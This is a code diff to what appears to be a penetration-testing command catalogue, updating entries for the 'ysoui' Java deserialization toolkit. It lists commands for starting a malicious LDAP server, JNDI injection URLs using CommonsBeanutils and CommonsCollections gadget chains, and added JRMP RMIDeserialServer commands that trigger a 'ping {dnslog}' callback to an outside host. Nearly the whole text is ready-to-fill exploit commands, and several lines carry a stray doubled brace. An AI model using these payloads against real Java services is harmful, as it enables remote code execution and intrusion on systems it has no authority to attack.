@@ -711,15 +711,23 @@ const ysouiCommands = withCommandType(
     [
         {
             "name": "Start Ldap Server",
-            "command": "java -cp ysoui-0.0.7-all.jar tools.exploit.LdapServer {ldapPort}",
+            "command": "java -cp ysoui-1.0-SNAPSHOT-with-dependencies.jar tools.exploit.LdapServer {ldapPort}",
             "meta": "",
         },
         {
             "name": "Deserialize",
-            "command": "ldap://{ip}:{ldapPort}/yso_p.CommonsBeanutilsNoCC1__c.{command}\n" +
-                "ldap://{ip}:{ldapPort}/yso_p.CommonsBeanutilsNoCC2__c.{command}\n" +
-                "ldap://{ip}:{ldapPort}/yso_p.CommonsCollectionsK1__c.{command}\n" +
-                "ldap://{ip}:{ldapPort}/yso_p.CommonsCollectionsK2__c.{command}\n" +
+            "command": "ldap://{ip}:{ldapPort}/yso_p.CommonsBeanutilsNoCC1__c.ping {dnslog}\n" +
+                "ldap://{ip}:{ldapPort}/yso_p.CommonsBeanutilsNoCC2__c.ping {dnslog}\n" +
+                "ldap://{ip}:{ldapPort}/yso_p.CommonsCollectionsK1__c.ping {dnslog}\n" +
+                "ldap://{ip}:{ldapPort}/yso_p.CommonsCollectionsK2__c.ping {dnslog}\n" +
+                "\n" +
+                "------- JRMP ----- \n" +
+                "java -cp ysoui-1.0-SNAPSHOT-with-dependencies.jar tools.exploit.RMIDeserialServer {port} yso_p.CommonsBeanutilsNoCC1__c.ping {dnslog}}\n" +
+                "java -cp ysoui-1.0-SNAPSHOT-with-dependencies.jar tools.exploit.RMIDeserialServer {port} yso_p.CommonsBeanutilsNoCC2__c.ping {dnslog}}\n" +
+                "java -cp ysoui-1.0-SNAPSHOT-with-dependencies.jar tools.exploit.RMIDeserialServer {port} yso_p.CommonsCollectionsK1__c.ping {dnslog}}\n" +
+                "java -cp ysoui-1.0-SNAPSHOT-with-dependencies.jar tools.exploit.RMIDeserialServer {port} yso_p.CommonsCollectionsK2__c.ping {dnslog}}\n" +
+                "ldap://{ip}:{ldapPort}/yso_p.JRMPClient__c.{ip}:{port}\n" +
+
                 "",
             "meta": "",
         },
